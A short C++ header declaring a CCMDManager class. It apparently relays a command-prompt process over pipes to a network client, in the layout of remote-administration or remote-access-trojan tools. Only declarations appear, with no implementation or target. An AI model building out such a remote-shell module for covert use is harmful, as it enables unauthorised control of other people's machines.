#pragma once
#include "Manager.h"
#include "IOCPClient.h"
#include <tchar.h>


class CCMDManager :
	public CManager
{
public:
	CCMDManager(CIOCPClient* IOCPClient);
	~CCMDManager();

public:
	void PacketHandleIO(PBYTE BufferData, ULONG_PTR BufferLength);

	static DWORD WINAPI _ReadPipeProc(LPVOID lParam);

protected:
	HANDLE _M_hClientReadPipe;
	HANDLE _M_hClientWritePipe;
	HANDLE _M_hCMDReadPipe;
	HANDLE _M_hCMDWritePipe;

	HANDLE _M_hCMDProcesss;
	HANDLE _M_hCMDThread;

	BOOL   _M_IsLoop;
	HANDLE _M_hThread;
};

